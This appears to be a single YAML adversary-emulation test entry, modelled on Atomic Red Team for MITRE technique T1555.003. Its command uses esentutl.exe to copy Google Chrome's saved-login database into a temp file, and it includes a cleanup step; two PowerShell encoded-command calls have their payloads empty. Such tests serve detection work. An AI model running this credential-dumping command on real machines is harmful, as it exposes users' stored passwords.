- requirements: []
  name: Soumaia ART Tests - Dump Chrome Login Data with esentutl
  description: 'This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome''s Login database.

    [Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)'
  tactic: credential-access
  technique_id: T1555.003
  technique_name: 'Credentials from Password Stores: Credentials from Web Browsers'
  executors:
  - cleanup:
    - del /f /q %temp%\T1555.003_Login_Data.tmp > nul 2>&1
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: powershell -NoProfile -EncodedCommand  & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand  ) & esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "%temp%\T1555.003_Login_Data.tmp"
  id: b634b96c-e037-58f5-8e42-204ecd2bf2e3
